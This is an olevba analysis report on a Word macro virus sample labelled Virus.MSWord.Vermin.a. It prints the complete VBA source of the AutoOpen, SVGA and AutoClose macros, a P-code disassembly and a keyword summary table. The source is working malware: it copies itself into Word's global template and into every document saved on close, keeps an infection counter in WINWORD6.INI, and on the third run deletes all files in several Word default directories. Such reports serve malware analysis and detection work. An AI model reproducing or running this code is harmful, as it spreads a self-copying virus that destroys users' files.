olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Vermin.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Vermin.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Vermin.a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub SD()
Dim DigitC$
Dim digit
DigitC$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " VERMIN", "WINWORD6.INI ")
digit = WordBasic.Val(DigitC$) + 1
WordBasic.SetPrivateProfileString "Microsoft Word", "VERMIN", Str(digit), "WINWORD6.INI"
DigitC$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "VERMIN", "WINWORD6.INI")
If DigitC$ = "3" Then
    WordBasic.SetPrivateProfileString "Microsoft Word", "VERMIN", "1", "WINWORD6.INI"

DigitC$ = WordBasic.[DefaultDir$](10) + "\*.*"
WordBasic.Kill DigitC$
DigitC$ = WordBasic.[DefaultDir$](11) + "\*.*"
WordBasic.Kill DigitC$
DigitC$ = WordBasic.[DefaultDir$](12) + "\*.*"
WordBasic.Kill DigitC$
DigitC$ = WordBasic.[DefaultDir$](15) + "\*.*"
WordBasic.Kill DigitC$

End If
End Sub 'SD

Public Sub MAIN()
Dim MCS
Dim op
Dim ACLS
Dim Automatical
Dim sMacro$
Dim DigitC$
Dim yesno
On Error GoTo -1: On Error GoTo No

    MCS = WordBasic.CountMacros(0, 0)
    For op = 1 To MCS
        If WordBasic.[MacroName$](op, 0, 0) = "AutoClose" Then
            ACLS = -1
        End If
        If WordBasic.[MacroName$](op, 0, 0) = "SVGA" Then
            Automatical = -1
        End If
    Next op
    If Not ACLS And Not Automatical Then
        sMacro$ = WordBasic.[FileName$]() + ":SVGA"
        WordBasic.MacroCopy sMacro$, "Global:SVGA"
        sMacro$ = WordBasic.[FileName$]() + ":AutoClose"
        WordBasic.MacroCopy sMacro$, "Global:AutoClose"
    End If
DigitC$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " VERMIN", "WINWORD6.INI")
yesno = WordBasic.Val(DigitC$)
If Not yesno Then
    SD
End If
No:
End Sub
-------------------------------------------------------------------------------
VBA MACRO SVGA.bas 
in file: ./Virus.MSWord.Vermin.a - OLE stream: 'Macros/VBA/SVGA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub SD()
Dim DigitC$
Dim digit
DigitC$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " VERMIN", "WINWORD6.INI ")
digit = WordBasic.Val(DigitC$) + 1
WordBasic.SetPrivateProfileString "Microsoft Word", "VERMIN", Str(digit), "WINWORD6.INI"
DigitC$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "VERMIN", "WINWORD6.INI")
If DigitC$ = "3" Then
    WordBasic.SetPrivateProfileString "Microsoft Word", "VERMIN", "1", "WINWORD6.INI"

DigitC$ = WordBasic.[DefaultDir$](10) + "\*.*"
WordBasic.Kill DigitC$
DigitC$ = WordBasic.[DefaultDir$](11) + "\*.*"
WordBasic.Kill DigitC$
DigitC$ = WordBasic.[DefaultDir$](12) + "\*.*"
WordBasic.Kill DigitC$
DigitC$ = WordBasic.[DefaultDir$](15) + "\*.*"
WordBasic.Kill DigitC$

End If
End Sub 'SD

Public Sub MAIN()
Dim MCS
Dim op
Dim ACLS
Dim Automatical
Dim sMacro$
Dim DigitC$
Dim yesno
On Error GoTo -1: On Error GoTo No

    MCS = WordBasic.CountMacros(0, 0)
    For op = 1 To MCS
        If WordBasic.[MacroName$](op, 0, 0) = "AutoClose" Then
            ACLS = -1
        End If
        If WordBasic.[MacroName$](op, 0, 0) = "SVGA" Then
            Automatical = -1
        End If
    Next op
    If Not ACLS And Not Automatical Then
        sMacro$ = WordBasic.[FileName$]() + ":SVGA"
        WordBasic.MacroCopy sMacro$, "Global:SVGA"
        sMacro$ = WordBasic.[FileName$]() + ":AutoClose"
        WordBasic.MacroCopy sMacro$, "Global:AutoClose"
    End If
DigitC$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " VERMIN", "WINWORD6.INI")
yesno = WordBasic.Val(DigitC$)
If Not yesno Then
    SD
End If
No:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Vermin.a - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim ParaMacro$
Dim WOpen$
Dim yesno
Dim Dialogues As Object: Set Dialogues = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo No
    WordBasic.CurValues.FileSaveAs Dialogues

    If Dialogues.Format = 0 Then Dialogues.Format = 1

    ParaMacro$ = WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.MacroCopy "Global:SVGA", ParaMacro$
    ParaMacro$ = WordBasic.[FileName$]() + ":SVGA"
    WordBasic.MacroCopy "Global:SVGA", ParaMacro$
    ParaMacro$ = WordBasic.[FileName$]() + ":AutoClose"
    WordBasic.MacroCopy "Global:AutoClose", ParaMacro$
    WordBasic.FileSaveAs Dialogues
    GoTo Yes
No:
    If Err.Number <> 102 Then
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " VERMIN", "WINWORD6.INI")
yesno = WordBasic.Val(WOpen$)
If Not yesno Then
    WordBasic.FileSaveAs Dialogues
End If
    End If
Yes:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Vermin.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 3382 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub SD())
' Line #2:
' 	Dim 
' 	VarDefn DigitC
' Line #3:
' 	Dim 
' 	VarDefn digit
' Line #4:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0007 " VERMIN"
' 	LitStr 0x000D "WINWORD6.INI "
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St DigitC$ 
' Line #5:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St digit 
' Line #6:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0006 "VERMIN"
' 	Ld digit 
' 	ArgsLd Str 0x0001 
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #7:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0006 "VERMIN"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St DigitC$ 
' Line #8:
' 	Ld DigitC$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0006 "VERMIN"
' 	LitStr 0x0001 "1"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #10:
' Line #11:
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St DigitC$ 
' Line #12:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #13:
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St DigitC$ 
' Line #14:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #15:
' 	LitDI2 0x000C 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St DigitC$ 
' Line #16:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #17:
' 	LitDI2 0x000F 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St DigitC$ 
' Line #18:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #19:
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	EndSub 
' 	QuoteRem 0x0008 0x0002 "SD"
' Line #22:
' Line #23:
' 	FuncDefn (Public Sub MAIN())
' Line #24:
' 	Dim 
' 	VarDefn MCS
' Line #25:
' 	Dim 
' 	VarDefn op
' Line #26:
' 	Dim 
' 	VarDefn ACLS
' Line #27:
' 	Dim 
' 	VarDefn Automatical
' Line #28:
' 	Dim 
' 	VarDefn sMacro
' Line #29:
' 	Dim 
' 	VarDefn DigitC
' Line #30:
' 	Dim 
' 	VarDefn yesno
' Line #31:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError No 
' Line #32:
' Line #33:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St MCS 
' Line #34:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MCS 
' 	For 
' Line #35:
' 	Ld op 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ACLS 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld op 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0004 "SVGA"
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Automatical 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	Ld ACLS 
' 	Not 
' 	Ld Automatical 
' 	Not 
' 	And 
' 	IfBlock 
' Line #43:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":SVGA"
' 	Add 
' 	St sMacro$ 
' Line #44:
' 	Ld sMacro$ 
' 	LitStr 0x000B "Global:SVGA"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #45:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sMacro$ 
' Line #46:
' 	Ld sMacro$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0007 " VERMIN"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St DigitC$ 
' Line #49:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	St yesno 
' Line #50:
' 	Ld yesno 
' 	Not 
' 	IfBlock 
' Line #51:
' 	ArgsCall SD 0x0000 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Label No 
' Line #54:
' 	EndSub 
' Macros/VBA/SVGA - 3373 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub SD())
' Line #2:
' 	Dim 
' 	VarDefn DigitC
' Line #3:
' 	Dim 
' 	VarDefn digit
' Line #4:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0007 " VERMIN"
' 	LitStr 0x000D "WINWORD6.INI "
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St DigitC$ 
' Line #5:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St digit 
' Line #6:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0006 "VERMIN"
' 	Ld digit 
' 	ArgsLd Str 0x0001 
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #7:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0006 "VERMIN"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St DigitC$ 
' Line #8:
' 	Ld DigitC$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	IfBlock 
' Line #9:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0006 "VERMIN"
' 	LitStr 0x0001 "1"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #10:
' Line #11:
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St DigitC$ 
' Line #12:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #13:
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St DigitC$ 
' Line #14:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #15:
' 	LitDI2 0x000C 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St DigitC$ 
' Line #16:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #17:
' 	LitDI2 0x000F 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Add 
' 	St DigitC$ 
' Line #18:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #19:
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	EndSub 
' 	QuoteRem 0x0008 0x0002 "SD"
' Line #22:
' Line #23:
' 	FuncDefn (Public Sub MAIN())
' Line #24:
' 	Dim 
' 	VarDefn MCS
' Line #25:
' 	Dim 
' 	VarDefn op
' Line #26:
' 	Dim 
' 	VarDefn ACLS
' Line #27:
' 	Dim 
' 	VarDefn Automatical
' Line #28:
' 	Dim 
' 	VarDefn sMacro
' Line #29:
' 	Dim 
' 	VarDefn DigitC
' Line #30:
' 	Dim 
' 	VarDefn yesno
' Line #31:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError No 
' Line #32:
' Line #33:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St MCS 
' Line #34:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MCS 
' 	For 
' Line #35:
' 	Ld op 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ACLS 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld op 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0004 "SVGA"
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Automatical 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld op 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	Ld ACLS 
' 	Not 
' 	Ld Automatical 
' 	Not 
' 	And 
' 	IfBlock 
' Line #43:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":SVGA"
' 	Add 
' 	St sMacro$ 
' Line #44:
' 	Ld sMacro$ 
' 	LitStr 0x000B "Global:SVGA"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #45:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sMacro$ 
' Line #46:
' 	Ld sMacro$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0007 " VERMIN"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St DigitC$ 
' Line #49:
' 	Ld DigitC$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	St yesno 
' Line #50:
' 	Ld yesno 
' 	Not 
' 	IfBlock 
' Line #51:
' 	ArgsCall SD 0x0000 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Label No 
' Line #54:
' 	EndSub 
' Macros/VBA/AutoClose - 2163 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn ParaMacro
' Line #3:
' 	Dim 
' 	VarDefn WOpen
' Line #4:
' 	Dim 
' 	VarDefn yesno
' Line #5:
' 	Dim 
' 	VarDefn Dialogues (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set Dialogues 
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError No 
' Line #7:
' 	Ld Dialogues 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' Line #9:
' 	Ld Dialogues 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld Dialogues 
' 	MemSt Format$ 
' 	EndIf 
' Line #10:
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St ParaMacro$ 
' Line #12:
' 	LitStr 0x000B "Global:SVGA"
' 	Ld ParaMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0005 ":SVGA"
' 	Add 
' 	St ParaMacro$ 
' Line #14:
' 	LitStr 0x000B "Global:SVGA"
' 	Ld ParaMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St ParaMacro$ 
' Line #16:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld ParaMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	Ld Dialogues 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #18:
' 	GoTo Yes 
' Line #19:
' 	Label No 
' Line #20:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0007 " VERMIN"
' 	LitStr 0x000C "WINWORD6.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #22:
' 	Ld WOpen$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	St yesno 
' Line #23:
' 	Ld yesno 
' 	Not 
' 	IfBlock 
' Line #24:
' 	Ld Dialogues 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Label Yes 
' Line #28:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

